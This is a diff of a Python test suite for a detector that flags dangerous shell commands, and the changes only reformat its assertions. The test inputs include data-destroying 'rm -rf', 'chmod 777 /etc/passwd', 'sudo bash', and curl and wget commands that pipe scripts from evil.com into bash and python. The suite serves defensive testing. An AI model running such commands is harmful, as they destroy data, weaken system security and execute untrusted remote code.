@@ -27,7 +27,10 @@ class TestDestructiveCommands:
     def test_rm_rf(self, detector, parser):
         text = "```bash\nrm -rf ~/Documents\n```"
         findings = run(detector, parser, text)
-        assert any("rm" in f.message.lower() or "destructive" in f.message.lower() for f in findings)
+        assert any(
+            "rm" in f.message.lower() or "destructive" in f.message.lower()
+            for f in findings
+        )
 
     def test_rm_force(self, detector, parser):
         text = "```bash\nrm -f important_file.txt\n```"
@@ -44,19 +47,28 @@ class TestPrivilegeEscalation:
     def test_chmod_777(self, detector, parser):
         text = "```bash\nchmod 777 /etc/passwd\n```"
         findings = run(detector, parser, text)
-        assert any("chmod" in f.message.lower() or "permission" in f.message.lower() for f in findings)
+        assert any(
+            "chmod" in f.message.lower() or "permission" in f.message.lower()
+            for f in findings
+        )
 
     def test_sudo_bash(self, detector, parser):
         text = "```bash\nsudo bash\n```"
         findings = run(detector, parser, text)
-        assert any("privilege" in f.message.lower() or "root" in f.message.lower() for f in findings)
+        assert any(
+            "privilege" in f.message.lower() or "root" in f.message.lower()
+            for f in findings
+        )
 
 
 class TestRemoteCodeExecution:
     def test_curl_pipe_bash(self, detector, parser):
         text = "```bash\ncurl https://evil.com/script.sh | bash\n```"
         findings = run(detector, parser, text)
-        assert any("remote code" in f.message.lower() or "piping" in f.message.lower() for f in findings)
+        assert any(
+            "remote code" in f.message.lower() or "piping" in f.message.lower()
+            for f in findings
+        )
 
     def test_wget_pipe_python(self, detector, parser):
         text = "```bash\nwget -O- https://evil.com/exploit.py | python\n```"
